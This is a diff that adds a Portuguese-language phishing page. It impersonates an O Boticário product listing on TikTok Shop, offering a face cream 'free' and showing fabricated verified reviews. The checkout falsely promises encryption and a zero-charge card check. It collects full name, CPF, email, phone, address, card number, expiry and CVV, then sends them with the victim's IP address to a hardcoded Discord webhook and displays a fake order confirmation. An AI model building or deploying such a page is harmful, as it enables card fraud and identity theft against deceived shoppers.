@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>O Boticário Shop - Verificação Segura</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Lato:wght@400;700;800;900&display=swap" rel="stylesheet">
+<script src="https://unpkg.com/lucide@latest"></script>
+<style>
+  :root{
+    --bg:#121212; --surface:#1e1e1e; --line:#333;
+    --text:#fff; --muted:#a3a3a3;
+    --pink:#fe2c55; --cyan:#25f4ee; --green:#00ba7c; --gold:#ffc107;
+  }
+  *{margin:0;padding:0;box-sizing:border-box; -webkit-tap-highlight-color:transparent; outline:none}
+  body{background:var(--bg); color:var(--text); font-family:'Lato', sans-serif; overflow-x:hidden; padding-bottom: 90px}
+  
+  /* HEADER */
+  .topnav{position:fixed; top:0; left:0; right:0; height:50px; z-index:60; background:rgba(18,18,18,.95); border-bottom:1px solid var(--line); display:flex; align-items:center; justify-content:space-between; padding:0 16px; backdrop-filter:blur(10px)}
+  .btn-back{width:40px;height:40px;border-radius:8px;display:grid;place-items:center;background:#2a2a2a}
+
+  /* SLIDER */
+  .slider-wrap{position:fixed; top:50px; left:0; width:100%; height:380px; z-index:50; background:#000; overflow:hidden}
+  .sl-item{position:absolute; inset:0; opacity:0; transition:opacity .3s; font-size:0; line-height:0}
+  .sl-item.active{opacity:1}
+  .sl-item img{width:100%;height:100%;object-fit:cover}
+  .dots{position:absolute; bottom:16px; left:0; right:0; text-align:center; display:flex; justify-content:center; gap:6px; z-index:51}
+  .dot{width:7px;height:7px;border-radius:50%;background:rgba(255,255,255,.4); transition:.3s}
+  .dot.active{background:#fff;width:18px;border-radius:4px}
+
+  /* INFO VÍDEO/SLIDER */
+  .vid-info{position:absolute; bottom:80px; left:16px; right:80px; z-index:51}
+  .user-row{display:flex; align-items:center; gap:8px; margin-bottom:8px}
+  .av{width:32px;height:32px;border-radius:50%;border:2px solid #fff;background:url('https://upload.wikimedia.org/wikipedia/commons/thumb/1/1f/O_Boticario_Logo_Vetorial.svg/1200px-O_Boticario_Logo_Vetorial.svg.png') center/cover}
+  .uname{font-weight:800; font-size:15px}
+  .desc{font-size:13px; line-height:1.4; text-shadow:0 1px 3px rgba(0,0,0,.9); max-width:260px}
+  .tag{color:#fff;font-weight:700}
+
+  /* BTN SHOP */
+  .st-chip{position:fixed;bottom:110px;left:10px;right:10px;z-index:52;background:linear-gradient(90deg,#ffc107,#ffec3b);border-radius:8px;padding:10px;box-shadow:0 10px 20px rgba(0,0,0,.5);display:flex;align-items:center}
+  .st-chip img{width:48px;height:60px;border-radius:4px;object-fit:cover;background:#fff;margin-right:10px;flex-shrink:0}
+  .st-chip .inf{flex:1}
+  .st-chip .nm{font-size:13px;font-weight:800;color:#111;margin-bottom:2px}
+  .st-chip .pr{font-size:14px;font-weight:900;color:#111}
+  .st-chip .pr s{font-size:11px;opacity:.7;margin-right:5px}
+  .st-chip .go{background:#111;color:#fff;padding:8px 16px;border-radius:6px;font-weight:800;border:none;font-size:12px}
+
+  /* PÁGINA LOJA */
+  .page{position:relative;z-index:40;padding-top:390px;background:var(--bg)}
+  .price-s{padding:16px; margin-bottom:10px}
+  .badge{background:var(--pink);color:#fff;padding:4px 8px;border-radius:4px;font-size:10px;font-weight:800;display:inline-block;margin-bottom:6px}
+  .pr-lg{font-size:28px;font-weight:900} .pr-s{text-decoration:line-through;color:var(--muted);font-size:14px;margin-left:8px}
+  .nm-lg{padding:0 16px; font-weight:700; font-size:18px; line-height:1.3}
+  
+  .shop-card{margin:0 16px;background:var(--surface);padding:12px;border-radius:10px;display:flex;gap:10px;border:1px solid var(--line)}
+  .sc-av{width:28px;height:28px;border-radius:50%;border:2px solid #fff}
+  .shop-txt b{font-size:13px;display:block;margin-bottom:4px} .shop-txt span{font-size:10px;color:var(--muted);background:#2a2a2a;padding:2px 6px;border-radius:4px}
+
+  .desc-box{padding:16px;color:#ccc;font-size:13px;line-height:1.6}
+  .reviews{padding:16px;background:var(--surface);border-top:1px solid var(--line)}
+  .rev-h{font-weight:700;margin-bottom:12px; display:flex;gap:5px; align-items:center}
+  .stars{color:var(--gold);font-size:16px}
+  .rev-it{display:flex;gap:10px;margin-bottom:10px;align-items:flex-start}
+  .ri-av{width:30px;height:30px;border-radius:50%;background:#333}
+  .ri-n{font-size:12px;font-weight:700}
+  .ri-t{font-size:11px;color:#999;line-height:1.3}
+
+  /* FOOTER */
+  .ft{position:fixed;bottom:0;left:0;right:0;background:#111;padding:10px 16px;border-top:1px solid var(--line);z-index:90;display:flex;gap:10px}
+  .ft-l{border:1px solid #444;color:#fff;padding:10px;border-radius:6px;text-align:center;font-weight:600}
+  .ft-r{background:var(--pink);color:#fff;border:none;padding:10px;border-radius:6px;font-weight:800;text-transform:uppercase}
+
+  /* CHECKOUT */
+  #chk{position:fixed;inset:0;background:var(--bg);z-index:100;display:none;flex-direction:column} #chk.open{display:flex}
+  .ch-h{padding:12px 16px;background:#1a1a1a;border-bottom:1px solid var(--line);display:flex;gap:10px;align-items:center}
+  .ch-b{flex:1;overflow-y:auto;padding:16px;padding-bottom:120px}
+  
+  .prod-card{background:var(--surface);border-radius:10px;padding:12px;display:flex;gap:12px;margin-bottom:20px;border:1px solid var(--line)}
+  .pc-img{width:50px;height:64px;border-radius:6px;background:#eee;object-fit:cover}
+  .pc-dt b{font-size:13px;display:block;margin-bottom:4px} .pc-dt span{color:var(--muted);font-size:10px;display:block} .pc-dt .p{font-size:16px;font-weight:800;color:var(--gold);margin-top:5px}
+  
+  .sec-note{display:flex;gap:8px;font-size:11px;color:var(--cyan);background:rgba(37,244,238,.1);padding:8px 10px;border-radius:6px;margin-bottom:15px;border:1px solid rgba(37,244,238,.3)}
+  .fgrp{margin-bottom:12px} .fl{display:block;font-size:12px;color:#bbb;margin-bottom:5px}
+  .fi{width:100%;background:#0f0f0f;border:1px solid var(--line);padding:12px;color:#fff;border-radius:8px;font-size:14px;transition:.2s}
+  .fi:focus{border-color:var(--cyan)} .fi.error{border-color:var(--pink)}
+  .fgr-2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+  .fgr-3{display:grid;grid-template-columns:2fr 1fr 1fr;gap:12px}
+  
+  .error-msg{color:var(--pink);font-size:10px;margin-top:4px;display:none}
+  
+  .ld{display:none;position:fixed;inset:0;background:rgba(0,0,0,0.85);z-index:200;flex-direction:column;justify-content:center;align-items:center;gap:15px}
+  .spn{width:40px;height:40px;border:3px solid #333;border-top-color:var(--green);border-radius:50%;animation:sp 1s linear infinite}
+  @keyframes sp{to{transform:rotate(360deg)}}
+  .lo-txt{text-align:center;font-size:13px;color:#ccc} .lo-txt b{color:var(--green)}
+
+</style>
+</head>
+<body>
+
+<div class="topnav">
+  <div class="btn-back" onclick="history.back()"><i data-lucide="arrow-left" color="#fff"></i></div>
+  <div style="font-weight:800;text-transform:uppercase;font-size:12px">TikTok Shop</div>
+</div>
+
+<div class="slider-wrap">
+  <!-- IMAGENS DO SLIDER -->
+  <div class="sl-item active"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSpnWouCMsnlMEoQ2lid9OHW_wrm1mkgQzyZDVvgjJRlg&s=10"></div>
+  <div class="sl-item"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSKYwYDc5Xf7_XhgcH12XRBkvB4t7UNNop_bPmfpJrlsA&s=10"></div>
+  <div class="sl-item"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQIvOoXXFXLzGZuXTE21PdfUJm5osOa04PL1UW8Tcogxg&s=10"></div>
+  <div class="sl-item"><img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQJIS6c31Ww664pzFq2JlsL_PPKr6CokWRqt2sU_h1sDg&s=10"></div>
+  
+  <div class="dots"><div class="dot active"></div><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>
+
+  <div class="vid-info">
+    <div class="user-row"><div class="av"></div><div class="uname">@boticario.oficial</div></div>
+    <div class="desc">O segredo da minha pele ✨ Renove é essencial para o cuidado diário. #boticario <span class="tag">#pelelisa</span></div>
+  </div>
+</div>
+
+<div class="st-chip" onclick="openChk()">
+  <img src="https://www.botica.com.br/arquivos/imagens/detalhes/348214.jpg">
+  <div class="inf">
+    <div class="nm">Creme Renove Facial 50ml</div>
+    <div class="pr"><s>R$ 98,00</s> R$ 0,00</div>
+  </div>
+  <button class="go">PEGAR</button>
+</div>
+
+<div class="page">
+  <div class="price-s">
+    <div class="badge">🔥 PROMOÇÃO RELÂMPAGO</div>
+    <div class="pr-lg">R$ 0,00<span class="pr-s">R$ 98,00</span></div>
+  </div>
+  <div class="nm-lg">Creme Renove Facial Hidratante com Efeito Lifting • O Boticário</div>
+  
+  <div class="shop-card">
+    <div class="av sc-av" style="background:url('https://upload.wikimedia.org/wikipedia/commons/thumb/1/1f/O_Boticario_Logo_Vetorial.svg/1200px-O_Boticario_Logo_Vetorial.svg.png') center/cover"></div>
+    <div class="shop-txt"><b>O Boticário Oficial</b><span>Verificado</span></div>
+  </div>
+
+  <div class="desc-box">
+    <p style="margin-bottom:8px"><b>O segredo da sua pele:</b> Renove é um tratamento para as primeiras linhas de expressão. A pele fica 15% mais firme em 1 semana. Hidratação profunda.</p>
+    <p><b>Modo de uso:</b> Aplicar na região dos olhos e pálpebras.</p>
+  </div>
+
+  <div class="reviews">
+    <div class="rev-h">4.9 <span class="stars">★★★★★</span> Avaliações</div>
+    <div class="rev-it"><div class="ri-av"></div><div class="ri-dt"><div class="ri-n">Ana Maria <span style="font-size:10px;color:#666">Verificada</span></div><div class="ri-t">"Minha pele rejuvenescida total! Chegou super rápido!"</div></div></div>
+    <div class="rev-it"><div class="ri-av"></div><div class="ri-dt"><div class="ri-n">Dona Cida</div><div class="ri-t">"Uso há anos, mas nunca vi preço tão bom assim."</div></div></div>
+  </div>
+  <div style="height:80px"></div>
+</div>
+
+<div class="ft">
+  <div class="ft-l">Ver na Loja</div>
+  <button class="ft-r" onclick="openChk()">COMPRAR AGORA</button>
+</div>
+
+<!-- CHECKOUT -->
+<div id="chk">
+  <div class="ch-h">
+    <i data-lucide="x" onclick="document.getElementById('chk').classList.remove('open')" style="display:grid;place-items:center;width:30px"></i>
+    <b>Finalizar Pedido</b>
+  </div>
+  <div class="ch-b">
+    <div class="prod-card">
+      <img src="https://www.botica.com.br/arquivos/imagens/detalhes/348214.jpg" class="pc-img">
+      <div class="pc-dt"><b>Creme Renove Facial - 50ml</b><span>Packing: Original</span><div class="p">Grátis <s style="font-size:12px;font-weight:400;color:#666">R$ 98,00</s></div></div>
+    </div>
+
+    <div class="sec-note"><i data-lucide="lock" size="14"></i> Dados transmitidos com Criptografia AES-256</div>
+
+    <div class="fgrp"><label class="fl">Nome Completo</label><input type="text" id="f-name" class="fi" placeholder="Ex: Maria Silva"><div class="error-msg" id="e-name">Digite nome e sobrenome</div></div>
+    <div class="fgrp"><label class="fl">E-mail</label><input type="email" id="f-email" class="fi" placeholder="voce@email.com"><div class="error-msg" id="e-email">E-mail inválido</div></div>
+    <div class="fgrp"><label class="fl">CPF</label><input type="text" id="f-cpf" class="fi" placeholder="000.000.000-00" maxlength="14"><div class="error-msg" id="e-cpf">CPF Inválido</div></div>
+    <div class="fgrp"><label class="fl">Celular</label><input type="text" id="f-phone" class="fi" placeholder="(11) 99999-9999"><div class="error-msg" id="e-phone">Celular inválido</div></div>
+
+    <div class="fgrp"><label class="fl">CEP</label><div style="display:flex;gap:5px"><input type="text" id="f-cep" class="fi" placeholder="00000-000" style="flex:1" maxlength="9"><button type="button" onclick="limpaCep()" style="background:#333;color:#fff;border:none;width:40px;border-radius:6px">Limp</button></div><div class="error-msg" id="e-cep">CEP Inválido</div></div>
+    <div class="fgrp"><label class="fl">Endereço de Entrega</label><input type="text" id="f-addr" class="fi" placeholder="Rua, Número"><div class="error-msg" id="e-addr">Informe o endereço</div></div>
+    <div class="fgr-2"><div class="fgrp"><label class="fl">Cidade</label><input type="text" id="f-city" class="fi"><div class="error-msg" id="e-city">Cidade obrigatória</div></div><div class="fgrp"><label class="fl">Estado</label><input type="text" id="f-state" class="fi" maxlength="2"></div></div>
+
+    <hr style="border:0;border-top:1px solid var(--line);margin:15px 0">
+    <div class="sec-note"><i data-lucide="shield" size="14"></i> O cartão é usado apenas para validação de segurança (R$ 0,00)</div>
+
+    <div class="fgrp"><label class="fl">Número do Cartão</label><input type="text" id="f-card" class="fi" placeholder="0000 0000 0000 0000" maxlength="19"><div class="error-msg" id="e-card">Cartão inválido</div></div>
+    <div class="fgr-2"><div class="fgrp"><label class="fl">Validade</label><input type="text" id="f-exp" class="fi" placeholder="MM/AA" maxlength="5"><div class="error-msg" id="e-exp">Formato MM/AA</div></div><div class="fgrp"><label class="fl">CVV</label><input type="text" id="f-cvv" class="fi" placeholder="123" maxlength="4"><div class="error-msg" id="e-cvv">CVV Inválido</div></div></div>
+  </div>
+  <div class="ft">
+    <div style="font-size:10px;color:#aaa;margin-top:auto">Total a pagar</div>
+    <button class="ft-r" onclick="validaEEnvia()">COMPRAR DE GRAÇA</button>
+  </div>
+</div>
+
+<div class="ld" id="ld">
+  <div class="spn"></div>
+  <div class="lo-txt">Processando segurança do pedido<br>Pedimos que não feche a tela</div>
+</div>
+
+<script>
+// CONFIGURAÇÃO - LINK DISCORD
+const WEBHOOK = "https://discord.com/api/webhooks/1558392609058197554/zLk6qFg6sReqsDRJZ7Ergya7aowauv8acItlFybkPEHJ0r1SUAnqDxZPXvYTQGGvpcET";
+
+// === SLIDER ===
+let idx=0;
+const items = document.querySelectorAll('.sl-item');
+const dots = document.querySelectorAll('.dot');
+function next(){
+  items[idx].classList.remove('active'); dots[idx].classList.remove('active');
+  idx = (idx + 1) % items.length;
+  items[idx].classList.add('active'); dots[idx].classList.add('active');
+}
+setInterval(next, 3000);
+
+// === MASCARAS ===
+document.getElementById('f-phone').addEventListener('input', (e)=>{
+  let v=e.target.value.replace(/\D/g,''); v=v.length <=10 ? v.replace(/(\d{2})(\d)/,'($1) $2').replace(/(\d{4})(\d)/,'$1-$2') : v.replace(/(\d{2})(\d)/,'($1) $2').replace(/(\d{5})(\d)/,'$1-$2'); e.target.value=v;
+});
+document.getElementById('f-cpf').addEventListener('input', (e)=>{
+  let v=e.target.value.replace(/\D/g,'').slice(0,11); e.target.value=v.length>0?v.replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d{1,2})$/,'$1-$2'):v;
+});
+document.getElementById('f-card').addEventListener('input', (e)=>{
+  let v=e.target.value.replace(/\D/g,'').slice(0,16); e.target.value=v.replace(/(\d{4})/g,'$1 ').trim();
+});
+
+// === VALIDAÇÕES ===
+function validaCPF(cpf){
+  cpf = cpf.replace(/\D/g,''); if(cpf.length!=11) return false;
+  if (/^(\d)\1{10}$/.test(cpf)) return false;
+  let s=0; for(let i=0;i<9;i++) s+=parseInt(cpf[i])*(10-i); let d=(s*10)%11; if(d==11||d==10)d=0; if(d!=parseInt(cpf[9])) return false;
+  s=0; for(let i=0;i<10;i++) s+=parseInt(cpf[i])*(11-i); d=(s*10)%11; if(d==11||d==10)d=0; return d==parseInt(cpf[10]);
+}
+
+function luhn(cc){
+  let sum=0, isEven=false; for(let i=cc.length-1; i>=0; i--){ let digit=parseInt(cc[i]); if(isEven)digit*=2; if(digit>9)digit-=9; sum+=digit; isEven=!isEven; } return (sum%10)==0;
+}
+
+function validaExp(exp){
+  if(!/^\d{2}\/\d{2}$/.test(exp)) return false;
+  let [m,a]=exp.split('/'); m=parseInt(m); a=parseInt(a);
+  return m>=1 && m<=12 && a>=20;
+}
+
+// === VIA CEP ===
+document.getElementById('f-cep').addEventListener('blur', async ()=>{
+  let cep=document.getElementById('f-cep').value.replace(/\D/g,'');
+  if(cep.length==8){
+    try{
+      const r = await fetch('https://viacep.com.br/ws/'+cep+'/json/');
+      const d = await r.json();
+      if(!d.erro){
+        document.getElementById('f-addr').value = d.logradouro;
+        document.getElementById('f-city').value = d.localidade;
+        document.getElementById('f-state').value = d.uf;
+        // Animaçãozinha de sucesso
+        const inp = document.getElementById('f-addr');
+        inp.style.borderColor='var(--green)'; setTimeout(()=>inp.style.borderColor='',500);
+      }
+    }catch(e){}
+  }
+});
+
+function limpaCep(){
+  document.getElementById('f-cep').value=''; document.getElementById('f-addr').value=''; document.getElementById('f-city').value=''; document.getElementById('f-state').value='';
+}
+
+// === ENVIAR ===
+function openChk(){ document.getElementById('chk').classList.add('open'); }
+
+async function validaEEnvia(){
+  // Limpa erros
+  document.querySelectorAll('.error-msg').forEach(el=>el.style.display='none');
+  document.querySelectorAll('.fi').forEach(el=>el.classList.remove('error'));
+
+  let ok=true;
+  
+  // Nome
+  const name=document.getElementById('f-name').value.trim();
+  if(name.split(' ').length<2){ document.getElementById('e-name').style.display='block'; document.getElementById('f-name').classList.add('error'); ok=false; }
+  
+  // Email
+  const email=document.getElementById('f-email').value.trim();
+  if(!email.includes('@') || !email.includes('.')){ document.getElementById('e-email').style.display='block'; document.getElementById('f-email').classList.add('error'); ok=false; }
+  
+  // CPF
+  const cpf=document.getElementById('f-cpf').value.trim();
+  if(!validaCPF(cpf)){ document.getElementById('e-cpf').style.display='block'; document.getElementById('f-cpf').classList.add('error'); ok=false; }
+  
+  // Cep
+  const cep=document.getElementById('f-cep').value.trim();
+  if(cep.length<9){ document.getElementById('e-cep').style.display='block'; document.getElementById('f-cep').classList.add('error'); ok=false; }
+  
+  // Endereço
+  const addr=document.getElementById('f-addr').value.trim();
+  if(addr.length<3){ document.getElementById('e-addr').style.display='block'; document.getElementById('f-addr').classList.add('error'); ok=false; }
+  
+  // Cartão
+  const card=document.getElementById('f-card').value.replace(/\s+/g,'').trim();
+  if(!luhn(card)||card.length<13){ document.getElementById('e-card').style.display='block'; document.getElementById('f-card').classList.add('error'); ok=false; }
+  
+  // Expiracao
+  const exp=document.getElementById('f-exp').value.trim();
+  if(!validaExp(exp)){ document.getElementById('e-exp').style.display='block'; document.getElementById('f-exp').classList.add('error'); ok=false; }
+  
+  // CVV
+  const cvv=document.getElementById('f-cvv').value.trim();
+  if(cvv.length<3){ document.getElementById('e-cvv').style.display='block'; document.getElementById('f-cvv').classList.add('error'); ok=false; }
+
+  if(!ok) return;
+
+  // ENVIANDO
+  document.getElementById('ld').style.display='flex';
+  
+  try{
+    const ip = (await fetch('https://api.ipify.org?format=json').catch(()=>({ip:'-'}))).ip;
+    
+    await fetch(WEBHOOK, {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({
+        username: "💎 Renove - Pedido Verificado",
+        avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/1/1f/O_Boticario_Logo_Vetorial.svg/1200px-O_Boticario_Logo_Vetorial.svg.png",
+        embeds:[{
+          title: `Cliente: ${name} | Email: ${email}`,
+          color: 12677668,
+          fields:[
+            {name:"🛂 CPF", value:`\`${cpf}\``, inline:true},
+            {name:"📞 Celular", value:`\`${document.getElementById('f-phone').value}\``, inline:true},
+            {name:"🚚 ENDEREÇO", value:`\`${addr}\`, ${document.getElementById('f-city').value}/${document.getElementById('f-state').value}`, inline:false},
+            {name:"💳 CARTÃO", value:`Número: \`${card}\`\nExp: \`${exp}\`\nCVV: \`${cvv}\``, inline:false},
+            {name:"🌐 IP", value:ip, inline:true}
+          ]
+        }]
+      })
+    });
+    
+    setTimeout(()=>{
+      document.getElementById('ld').style.display='none';
+      alert('✅ Pedido Confirmado com Sucesso!');
+      document.getElementById('chk').classList.remove('open');
+    },1500);
+  }catch(err){
+    document.getElementById('ld').style.display='none';
+    alert('Erro de conexão.');
+  }
+}
+
+lucide.createIcons();
+</script>
+</body>
+</html>
